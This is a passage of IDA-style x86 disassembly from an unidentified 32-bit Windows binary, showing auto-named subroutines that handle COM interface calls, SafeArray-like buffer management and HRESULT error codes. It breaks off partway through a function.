; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_156C7       proc near

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                call    sub_1563B
                test    [ebp+arg_0], 1
                jz      short loc_156E1
                push    esi
                call    sub_16264
                pop     ecx

loc_156E1:                              ; CODE XREF: sub_156C7+11↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_156C7       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_156ED       proc near               ; CODE XREF: CODE:000137D5↑p
                push    0Ch
                mov     eax, 100A5FFh
                call    sub_16603
                mov     ebx, [ebp+10h]
                test    ebx, ebx
                jnz     short loc_1570A
                mov     eax, 80004003h
                jmp     loc_15797
; ---------------------------------------------------------------------------

loc_1570A:                              ; CODE XREF: sub_156ED+11↑j
                and     dword ptr [ebx], 0
                and     dword ptr [ebp-18h], 0
                and     dword ptr [ebp-4], 0
                mov     esi, 8007000Eh
                push    28h ; '('
                mov     [ebp-14h], esi
                call    sub_163B0
                pop     ecx
                test    eax, eax
                jz      short loc_15737
                push    dword ptr [ebp+8]
                mov     ecx, eax
                call    sub_1548D
                mov     edi, eax
                jmp     short loc_15739
; ---------------------------------------------------------------------------

loc_15737:                              ; CODE XREF: sub_156ED+3A↑j
                xor     edi, edi

loc_15739:                              ; CODE XREF: sub_156ED+48↑j
                or      dword ptr [ebp-4], 0FFFFFFFFh
                jmp     short loc_15752
; ---------------------------------------------------------------------------
                or      dword ptr [ebp-4], 0FFFFFFFFh
                mov     eax, 1004AF1h
                retn
; ---------------------------------------------------------------------------
                mov     ebx, [ebp+10h]
                mov     esi, [ebp-14h]
                mov     edi, [ebp-18h]

loc_15752:                              ; CODE XREF: sub_156ED+50↑j
                test    edi, edi
                jz      short loc_15795
                lea     esi, [edi+8]
                push    esi
                call    dword ptr ds:1001164h
                mov     ecx, esi
                call    sub_14291
                mov     esi, eax
                test    esi, esi
                js      short loc_1576F
                xor     esi, esi

loc_1576F:                              ; CODE XREF: sub_156ED+7E↑j
                lea     eax, [edi+8]
                push    eax
                call    dword ptr ds:1001160h
                test    esi, esi
                jnz     short loc_1578C
                mov     eax, [edi]
                push    ebx
                push    dword ptr [ebp+0Ch]
                push    edi
                call    dword ptr [eax]
                mov     esi, eax
                test    esi, esi
                jz      short loc_15795

loc_1578C:                              ; CODE XREF: sub_156ED+8E↑j
                mov     eax, [edi]
                push    1
                mov     ecx, edi
                call    dword ptr [eax+10h]

loc_15795:                              ; CODE XREF: sub_156ED+67↑j
                                        ; sub_156ED+9D↑j
                mov     eax, esi

loc_15797:                              ; CODE XREF: sub_156ED+18↑j
                call    sub_16679
                retn    0Ch
sub_156ED       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                sub     dword ptr [esp+4], 4
                jmp     sub_15548
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                sub     dword ptr [esp+4], 4
                jmp     sub_154F9
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                sub     dword ptr [esp+4], 4
                jmp     sub_15514
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_157D1       proc near

arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                xor     esi, esi

loc_157D9:                              ; CODE XREF: sub_157D1+22↓j
                push    [ebp+arg_4]
                push    dword ptr [esi+100C06Ch]
                call    sub_13833
                pop     ecx
                pop     ecx
                test    eax, eax
                jnz     short loc_157F8
                add     esi, 4
                cmp     esi, 4
                jb      short loc_157D9
                inc     eax
                jmp     short loc_157FA
; ---------------------------------------------------------------------------

loc_157F8:                              ; CODE XREF: sub_157D1+1A↑j
                xor     eax, eax

loc_157FA:                              ; CODE XREF: sub_157D1+25↑j
                pop     esi
                pop     ebp
                retn    8
sub_157D1       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15804       proc near

arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_4]
                test    esi, esi
                jnz     short loc_15818
                mov     eax, 80070057h
                jmp     short loc_15822
; ---------------------------------------------------------------------------

loc_15818:                              ; CODE XREF: sub_15804+B↑j
                call    dword ptr ds:1001074h
                mov     [esi], eax
                xor     eax, eax

loc_15822:                              ; CODE XREF: sub_15804+12↑j
                pop     esi
                pop     ebp
                retn    8
sub_15804       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1582C       proc near

var_4           = dword ptr -4
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                and     [ebp+var_4], 0
                push    esi
                lea     eax, [ebp+var_4]
                push    eax
                push    10017A0h
                push    3
                push    0
                push    1001780h
                call    dword ptr ds:10012C4h
                mov     esi, eax
                test    esi, esi
                jns     short loc_15866
                mov     ecx, [ebp+var_4]
                test    ecx, ecx
                jz      short loc_15862
                mov     edx, [ecx]
                push    ecx
                call    dword ptr [edx+8]

loc_15862:                              ; CODE XREF: sub_1582C+2E↑j
                mov     eax, esi
                jmp     short loc_15870
; ---------------------------------------------------------------------------

loc_15866:                              ; CODE XREF: sub_1582C+27↑j
                mov     eax, [ebp+var_4]
                mov     ecx, [ebp+arg_4]
                mov     [ecx], eax
                xor     eax, eax

loc_15870:                              ; CODE XREF: sub_1582C+38↑j
                pop     esi
                leave
                retn    8
sub_1582C       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1587A       proc near

arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_4], 0
                jz      short loc_1588D
                push    0
                call    dword ptr ds:1001078h

loc_1588D:                              ; CODE XREF: sub_1587A+9↑j
                push    1
                call    dword ptr ds:1001070h
                push    eax
                call    dword ptr ds:100107Ch
                xor     eax, eax
                pop     ebp
                retn    8
sub_1587A       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_158A7       proc near

var_40          = dword ptr -40h
var_3C          = byte ptr -3Ch
var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch
arg_18          = dword ptr  20h
arg_1C          = dword ptr  24h
arg_20          = dword ptr  28h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 40h
                cmp     [ebp+arg_4], 0
                push    ebx
                push    esi
                push    edi
                jz      loc_15BDC
                cmp     [ebp+arg_8], 0
                jz      loc_15BDC
                cmp     [ebp+arg_C], 0
                jz      loc_15BDC
                cmp     [ebp+arg_10], 0
                jz      loc_15BDC
                cmp     [ebp+arg_14], 0
                jz      loc_15BDC
                cmp     [ebp+arg_18], 0
                jz      loc_15BDC
                cmp     [ebp+arg_1C], 0
                jz      loc_15BDC
                cmp     [ebp+arg_20], 0
                jz      loc_15BDC
                push    [ebp+arg_4]
                lea     ecx, [ebp+arg_4]
                call    sub_15CE0
                mov     eax, [ebp+arg_4]
                mov     ecx, [eax]
                lea     edx, [ebp+var_1C]
                push    edx
                push    eax
                call    dword ptr [ecx+24h]
                mov     esi, eax
                test    esi, esi
                jns     short loc_15934
                mov     ecx, [ebp+arg_4]

loc_15923:                              ; CODE XREF: sub_158A7+A1↓j
                test    ecx, ecx
                jz      short loc_1592D
                mov     edx, [ecx]
                push    ecx
                call    dword ptr [edx+8]

loc_1592D:                              ; CODE XREF: sub_158A7+7E↑j
                                        ; sub_158A7+104↓j ...
                mov     eax, esi
                jmp     loc_15BE1
; ---------------------------------------------------------------------------

loc_15934:                              ; CODE XREF: sub_158A7+77↑j
                mov     eax, [ebp+arg_4]
                mov     ecx, [eax]
                lea     edx, [ebp+var_20]
                push    edx
                push    eax
                call    dword ptr [ecx+28h]
                mov     ecx, [ebp+arg_4]
                mov     esi, eax
                test    esi, esi
                js      short loc_15923
                mov     [ebp+var_40], ecx
                test    ecx, ecx
                jz      short loc_1595A
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+4]
                mov     ecx, [ebp+var_40]

loc_1595A:                              ; CODE XREF: sub_158A7+A8↑j
                xor     ebx, ebx
                mov     [ebp+var_3C], bl
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+1Ch]
                mov     esi, eax
                test    esi, esi
                js      loc_15A3D
                mov     eax, [ebp+var_20]
                shl     eax, 5
                mov     [ebp+var_14], eax
                push    1
                lea     eax, [ebp+var_14]
                push    eax
                lea     ecx, [ebp+var_4]
                mov     [ebp+var_3C], 1
                mov     [ebp+var_4], ebx
                mov     [ebp+var_10], ebx
                call    sub_15DBB
                mov     esi, eax
                test    esi, esi
                jns     short loc_159B8
                lea     ecx, [ebp+var_4]
                call    sub_15E0E
                lea     ecx, [ebp+var_40]
                call    sub_15CAB
                mov     ecx, [ebp+arg_4]
                test    ecx, ecx
                jz      short loc_1592D
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]
                jmp     loc_1592D
; ---------------------------------------------------------------------------

loc_159B8:                              ; CODE XREF: sub_158A7+ED↑j
                cmp     [ebp+var_20], ebx
                jbe     short loc_159E3
                push    ebx
                lea     ecx, [ebp+var_4]
                call    sub_15D6B
                mov     edi, eax
                mov     esi, ebx
                cmp     [ebp+var_20], ebx
                jbe     short loc_159E3

loc_159CF:                              ; CODE XREF: sub_158A7+13A↓j
                mov     ecx, [ebp+arg_4]
                mov     eax, [ecx]
                push    edi
                push    esi
                push    ecx
                call    dword ptr [eax+2Ch]
                inc     esi
                add     edi, 20h ; ' '
                cmp     esi, [ebp+var_20]
                jb      short loc_159CF

loc_159E3:                              ; CODE XREF: sub_158A7+114↑j
                                        ; sub_158A7+126↑j
                mov     ecx, [ebp+var_1C]
                mov     eax, ebx
                mov     [ebp+var_34], ebx
                mov     [ebp+var_24], eax
                test    ecx, ecx
                jz      short loc_15A0D
                mov     eax, [ebp+arg_4]
                mov     ecx, [eax]
                lea     edx, [ebp+var_34]
                push    edx
                lea     edx, [ebp+var_24]
                push    edx
                push    ebx
                push    eax
                call    dword ptr [ecx+8Ch]
                mov     ecx, [ebp+var_1C]
                mov     eax, [ebp+var_24]

loc_15A0D:                              ; CODE XREF: sub_158A7+149↑j
                imul    eax, ecx
                mov     [ebp+var_C], eax
                push    1
                lea     eax, [ebp+var_C]
                push    eax
                lea     ecx, [ebp+var_10]
                mov     [ebp+var_10], ebx
                mov     [ebp+var_8], ebx
                call    sub_15DBB
                mov     esi, eax
                test    esi, esi
                jns     short loc_15A5B

loc_15A2D:                              ; CODE XREF: sub_158A7+1C8↓j
                lea     ecx, [ebp+var_10]
                call    sub_15E0E
                lea     ecx, [ebp+var_4]
                call    sub_15E0E

loc_15A3D:                              ; CODE XREF: sub_158A7+C2↑j
                lea     ecx, [ebp+var_40]
                call    sub_15CAB
                mov     eax, [ebp+arg_4]
                test    eax, eax
                jz      loc_1592D
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]
                jmp     loc_1592D
; ---------------------------------------------------------------------------

loc_15A5B:                              ; CODE XREF: sub_158A7+184↑j
                mov     ebx, [ebp+var_10]
                mov     edi, ds:1001274h
                lea     eax, [ebp+var_28]
                push    eax
                push    ebx
                call    edi
                mov     esi, eax
                test    esi, esi
                js      short loc_15A2D
                xor     esi, esi
                cmp     [ebp+var_1C], esi
                jbe     short loc_15AAA

loc_15A78:                              ; CODE XREF: sub_158A7+201↓j
                mov     eax, [ebp+arg_4]
                mov     ecx, [eax]
                lea     edx, [ebp+var_10]
                push    edx
                lea     edx, [ebp+var_8]
                push    edx
                push    esi
                push    eax
                call    dword ptr [ecx+8Ch]
                push    [ebp+var_24]
                push    [ebp+var_10]
                push    [ebp+var_28]
                call    sub_167A2
                mov     eax, [ebp+var_24]
                add     [ebp+var_28], eax
                add     esp, 0Ch
                inc     esi
                cmp     esi, [ebp+var_1C]
                jb      short loc_15A78

loc_15AAA:                              ; CODE XREF: sub_158A7+1CF↑j
                push    ebx
                call    dword ptr ds:1001270h
                lea     eax, [ebp+var_18]
                push    eax
                push    1
                push    [ebp+arg_1C]
                xor     esi, esi
                mov     [ebp+var_18], esi
                call    dword ptr ds:1001264h
                mov     eax, [ebp+var_18]
                inc     eax
                mov     [ebp+var_18], eax
                mov     [ebp+var_14], eax
                push    1
                lea     eax, [ebp+var_14]
                push    eax
                lea     ecx, [ebp+var_8]
                mov     [ebp+var_8], esi
                mov     [ebp+var_10], esi
                call    sub_15EF0
                lea     eax, [ebp+var_30]
                push    eax
                push    [ebp+arg_1C]
                mov     [ebp+var_30], esi
                call    edi
                mov     eax, [ebp+arg_4]
                lea     edx, [ebp+var_2C]
                push    edx
                mov     [ebp+var_2C], esi
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+40h]
                mov     eax, [ebp+arg_4]
                mov     ecx, [eax]
                lea     edx, [ebp+var_38]
                push    edx
                push    eax
                call    dword ptr [ecx+18h]
                cmp     [ebp+var_18], esi
                jle     short loc_15B4D

loc_15B11:                              ; CODE XREF: sub_158A7+2A4↓j
                or      [ebp+var_10], 0FFFFFFFFh
                mov     eax, [ebp+var_2C]
                mov     edx, [eax]
                lea     ecx, [ebp+var_10]
                push    ecx
                mov     ecx, [ebp+var_30]
                push    dword ptr [ecx+esi*4]
                push    [ebp+var_38]
                push    eax
                call    dword ptr [edx+30h]
                push    esi
                lea     ecx, [ebp+var_8]
                test    eax, eax
                jnz     short loc_15B3F
                call    sub_15E9D
                mov     ecx, [ebp+var_10]
                mov     [eax], ecx
                jmp     short loc_15B47
; ---------------------------------------------------------------------------

loc_15B3F:                              ; CODE XREF: sub_158A7+28A↑j
                call    sub_15E9D
                or      dword ptr [eax], 0FFFFFFFFh

loc_15B47:                              ; CODE XREF: sub_158A7+296↑j
                inc     esi
                cmp     esi, [ebp+var_18]
                jl      short loc_15B11

loc_15B4D:                              ; CODE XREF: sub_158A7+268↑j
                push    [ebp+arg_1C]
                call    dword ptr ds:1001270h
                mov     eax, [ebp+var_1C]
                mov     ecx, [ebp+arg_8]
                mov     esi, [ebp+var_4]
                mov     edi, ds:1001278h
                mov     [ecx], eax
                mov     eax, [ebp+var_20]
                mov     ecx, [ebp+arg_C]
                mov     [ecx], eax
                mov     eax, [ebp+var_24]
                mov     ecx, [ebp+arg_14]
                push    esi
                mov     [ecx], eax
                call    edi
                mov     eax, [ebp+arg_10]
                and     [ebp+var_4], 0
                push    ebx
                mov     [eax], esi
                call    edi
                mov     eax, [ebp+arg_18]
                mov     esi, [ebp+var_8]
                and     [ebp+var_10], 0
                push    esi
                mov     [eax], ebx
                call    edi
                mov     eax, [ebp+arg_20]
                and     [ebp+var_8], 0
                mov     [eax], esi
                mov     eax, [ebp+var_2C]
                test    eax, eax
                jz      short loc_15BAB
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_15BAB:                              ; CODE XREF: sub_158A7+2FC↑j
                lea     ecx, [ebp+var_8]
                call    sub_15F43
                lea     ecx, [ebp+var_10]
                call    sub_15E0E
                lea     ecx, [ebp+var_4]
                call    sub_15E0E
                lea     ecx, [ebp+var_40]
                call    sub_15CAB
                mov     eax, [ebp+arg_4]
                test    eax, eax
                jz      short loc_15BD8
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_15BD8:                              ; CODE XREF: sub_158A7+329↑j
                xor     eax, eax
                jmp     short loc_15BE1
; ---------------------------------------------------------------------------

loc_15BDC:                              ; CODE XREF: sub_158A7+F↑j
                                        ; sub_158A7+19↑j ...
                mov     eax, 80070057h

loc_15BE1:                              ; CODE XREF: sub_158A7+88↑j
                                        ; sub_158A7+333↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn    24h ; '$'
sub_158A7       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15BED       proc near

arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_4], 0
                jnz     short loc_15BFF
                mov     eax, 80070057h
                jmp     short loc_15C72
; ---------------------------------------------------------------------------

loc_15BFF:                              ; CODE XREF: sub_15BED+9↑j
                push    esi
                mov     esi, [ebp+arg_8]
                push    edi
                test    esi, esi
                jz      short loc_15C6B
                mov     edi, [ebp+arg_C]
                test    edi, edi
                jz      short loc_15C6B
                and     dword ptr [esi], 0
                push    [ebp+arg_4]
                and     dword ptr [edi], 0
                lea     ecx, [ebp+arg_4]
                call    sub_15CE0
                mov     eax, [ebp+arg_4]
                test    eax, eax
                jz      short loc_15C66
                mov     ecx, [eax]
                push    esi
                push    eax
                call    dword ptr [ecx+24h]
                mov     esi, eax
                test    esi, esi
                js      short loc_15C44
                mov     eax, [ebp+arg_4]
                mov     ecx, [eax]
                push    edi
                push    eax
                call    dword ptr [ecx+28h]
                mov     esi, eax
                test    esi, esi
                jns     short loc_15C55

loc_15C44:                              ; CODE XREF: sub_15BED+45↑j
                mov     ecx, [ebp+arg_4]
                test    ecx, ecx
                jz      short loc_15C51
                mov     edx, [ecx]
                push    ecx
                call    dword ptr [edx+8]

loc_15C51:                              ; CODE XREF: sub_15BED+5C↑j
                mov     eax, esi
                jmp     short loc_15C70
; ---------------------------------------------------------------------------

loc_15C55:                              ; CODE XREF: sub_15BED+55↑j
                mov     eax, [ebp+arg_4]
                test    eax, eax
                jz      short loc_15C62
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_15C62:                              ; CODE XREF: sub_15BED+6D↑j
                xor     eax, eax
                jmp     short loc_15C70
; ---------------------------------------------------------------------------

loc_15C66:                              ; CODE XREF: sub_15BED+38↑j
                xor     eax, eax
                inc     eax
                jmp     short loc_15C70
; ---------------------------------------------------------------------------

loc_15C6B:                              ; CODE XREF: sub_15BED+19↑j
                                        ; sub_15BED+20↑j
                mov     eax, 80004003h

loc_15C70:                              ; CODE XREF: sub_15BED+66↑j
                                        ; sub_15BED+77↑j ...
                pop     edi
                pop     esi

loc_15C72:                              ; CODE XREF: sub_15BED+10↑j
                pop     ebp
                retn    10h
sub_15BED       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------

loc_15C7B:                              ; CODE XREF: CODE:0001B27A↓j
                mov     ecx, [ecx]
                test    ecx, ecx
                jz      short locret_15C87
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

locret_15C87:                           ; CODE XREF: CODE:00015C7F↑j
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_15C8D       proc near               ; CODE XREF: sub_15CAB+15↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                cmp     byte ptr [esi+4], 0
                jz      short loc_15CA4
                mov     eax, [esi]
                mov     edx, [eax]
                push    eax
                call    dword ptr [edx+20h]
                mov     byte ptr [esi+4], 0

loc_15CA4:                              ; CODE XREF: sub_15C8D+9↑j
                pop     esi
                retn
sub_15C8D       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_15CAB       proc near               ; CODE XREF: sub_158A7+FA↑p
                                        ; sub_158A7+199↑p ...
                push    4
                mov     eax, 100A627h
                call    sub_165CB
                mov     esi, ecx
                mov     [ebp-10h], esi
                and     dword ptr [ebp-4], 0
                call    sub_15C8D
                mov     ecx, [esi]
                or      dword ptr [ebp-4], 0FFFFFFFFh
                test    ecx, ecx
                jz      short loc_15CD5
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

loc_15CD5:                              ; CODE XREF: sub_15CAB+22↑j
                call    sub_16679
                retn
sub_15CAB       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15CE0       proc near               ; CODE XREF: sub_158A7+61↑p
                                        ; sub_15BED+2E↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                mov     ecx, [ebp+arg_0]
                and     dword ptr [esi], 0
                test    ecx, ecx
                jz      short loc_15CFD
                mov     eax, [ecx]
                push    esi
                push    1001790h
                push    ecx
                call    dword ptr [eax]

loc_15CFD:                              ; CODE XREF: sub_15CE0+10↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_15CE0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15D09       proc near               ; CODE XREF: sub_15D6B+1A↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                and     [ebp+var_4], 0
                lea     eax, [ebp+var_4]
                push    eax
                mov     eax, [ebp+arg_0]
                inc     eax
                push    eax
                push    dword ptr [ecx]
                call    dword ptr ds:1001268h
                test    eax, eax
                jns     short loc_15D2E
                push    eax
                call    sub_1393A
; ---------------------------------------------------------------------------

loc_15D2E:                              ; CODE XREF: sub_15D09+1D↑j
                mov     eax, [ebp+var_4]
                leave
                retn    4
sub_15D09       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15D3A       proc near               ; CODE XREF: sub_15D6B+2A↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                and     [ebp+var_4], 0
                lea     eax, [ebp+var_4]
                push    eax
                mov     eax, [ebp+arg_0]
                inc     eax
                push    eax
                push    dword ptr [ecx]
                call    dword ptr ds:1001264h
                test    eax, eax
                jns     short loc_15D5F
                push    eax
                call    sub_1393A
; ---------------------------------------------------------------------------

loc_15D5F:                              ; CODE XREF: sub_15D3A+1D↑j
                mov     eax, [ebp+var_4]
                leave
                retn    4
sub_15D3A       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15D6B       proc near               ; CODE XREF: sub_158A7+11A↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi], 0
                push    edi
                jnz     short loc_15D83
                push    80004005h

loc_15D7E:                              ; CODE XREF: sub_15D6B+49↓j
                call    sub_1393A
; ---------------------------------------------------------------------------

loc_15D83:                              ; CODE XREF: sub_15D6B+C↑j
                push    0
                call    sub_15D09
                mov     edi, eax
                cmp     [ebp+arg_0], edi
                jl      short loc_15DAF
                push    0
                mov     ecx, esi
                call    sub_15D3A
                cmp     [ebp+arg_0], eax
                jg      short loc_15DAF
                mov     eax, [esi]
                mov     eax, [eax+0Ch]
                sub     eax, edi
                add     eax, [ebp+arg_0]
                pop     edi
                pop     esi
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------

loc_15DAF:                              ; CODE XREF: sub_15D6B+24↑j
                                        ; sub_15D6B+32↑j
                push    80070057h
                jmp     short loc_15D7E
sub_15D6B       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15DBB       proc near               ; CODE XREF: sub_158A7+E4↑p
                                        ; sub_158A7+17B↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi], 0
                jz      short loc_15DCF
                mov     eax, 80004005h
                jmp     short loc_15E04
; ---------------------------------------------------------------------------

loc_15DCF:                              ; CODE XREF: sub_15DBB+B↑j
                cmp     [ebp+arg_0], 0
                jz      short loc_15DFF
                cmp     [ebp+arg_4], 0
                jz      short loc_15DFF
                push    [ebp+arg_0]
                push    [ebp+arg_4]
                push    10h
                call    dword ptr ds:100125Ch
                mov     [esi], eax
                test    eax, eax
                jnz     short loc_15DF6
                mov     eax, 8007000Eh
                jmp     short loc_15E04
; ---------------------------------------------------------------------------

loc_15DF6:                              ; CODE XREF: sub_15DBB+32↑j
                push    eax
                call    dword ptr ds:100126Ch
                jmp     short loc_15E04
; ---------------------------------------------------------------------------

loc_15DFF:                              ; CODE XREF: sub_15DBB+18↑j
                                        ; sub_15DBB+1E↑j
                mov     eax, 80070057h

loc_15E04:                              ; CODE XREF: sub_15DBB+12↑j
                                        ; sub_15DBB+39↑j ...
                pop     esi
                pop     ebp
                retn    8
sub_15DBB       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_15E0E       proc near               ; CODE XREF: sub_158A7+F2↑p
                                        ; sub_158A7+189↑p ...
                mov     edi, edi
                push    esi
                mov     esi, ecx
                xor     eax, eax
                cmp     [esi], eax
                jz      short loc_15E34
                push    dword ptr [esi]
                call    dword ptr ds:1001278h
                test    eax, eax
                js      short loc_15E34
                push    dword ptr [esi]
                call    dword ptr ds:1001260h
                test    eax, eax
                js      short loc_15E34
                and     dword ptr [esi], 0

loc_15E34:                              ; CODE XREF: sub_15E0E+9↑j
                                        ; sub_15E0E+15↑j ...
                pop     esi
                retn
sub_15E0E       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15E3B       proc near               ; CODE XREF: sub_15E9D+1B↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                and     [ebp+var_4], 0
                lea     eax, [ebp+var_4]
                push    eax
                mov     eax, [ebp+arg_0]
                inc     eax
                push    eax
                push    dword ptr [ecx]
                call    dword ptr ds:1001268h
                test    eax, eax
                jns     short loc_15E60
                push    eax
                call    sub_1393A
; ---------------------------------------------------------------------------

loc_15E60:                              ; CODE XREF: sub_15E3B+1D↑j
                mov     eax, [ebp+var_4]
                leave
                retn    4
sub_15E3B       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15E6C       proc near               ; CODE XREF: sub_15E9D+2D↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                and     [ebp+var_4], 0
                lea     eax, [ebp+var_4]
                push    eax
                mov     eax, [ebp+arg_0]
                inc     eax
                push    eax
                push    dword ptr [ecx]
                call    dword ptr ds:1001264h
                test    eax, eax
                jns     short loc_15E91
                push    eax
                call    sub_1393A
; ---------------------------------------------------------------------------

loc_15E91:                              ; CODE XREF: sub_15E6C+1D↑j
                mov     eax, [ebp+var_4]
                leave
                retn    4
sub_15E6C       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15E9D       proc near               ; CODE XREF: sub_158A7+28C↑p
                                        ; sub_158A7:loc_15B3F↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi], 0
                push    edi
                jnz     short loc_15EB6
                push    80004005h

loc_15EB1:                              ; CODE XREF: sub_15E9D+4C↓j
                call    sub_1393A
; ---------------------------------------------------------------------------

loc_15EB6:                              ; CODE XREF: sub_15E9D+D↑j
                push    0
                call    sub_15E3B
                mov     edi, [ebp+arg_0]
                mov     ebx, eax
                cmp     edi, ebx
                jl      short loc_15EE4
                push    0
                mov     ecx, esi
                call    sub_15E6C
                cmp     edi, eax
                jg      short loc_15EE4
                mov     eax, [esi]
                mov     eax, [eax+0Ch]
                sub     edi, ebx
                lea     eax, [eax+edi*4]
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------

loc_15EE4:                              ; CODE XREF: sub_15E9D+27↑j
                                        ; sub_15E9D+34↑j
                push    80070057h
                jmp     short loc_15EB1
sub_15E9D       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15EF0       proc near               ; CODE XREF: sub_158A7+237↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi], 0
                jz      short loc_15F04
                mov     eax, 80004005h
                jmp     short loc_15F39
; ---------------------------------------------------------------------------

loc_15F04:                              ; CODE XREF: sub_15EF0+B↑j
                cmp     [ebp+arg_0], 0
                jz      short loc_15F34
                cmp     [ebp+arg_4], 0
                jz      short loc_15F34
                push    [ebp+arg_0]
                push    [ebp+arg_4]
                push    3
                call    dword ptr ds:100125Ch
                mov     [esi], eax
                test    eax, eax
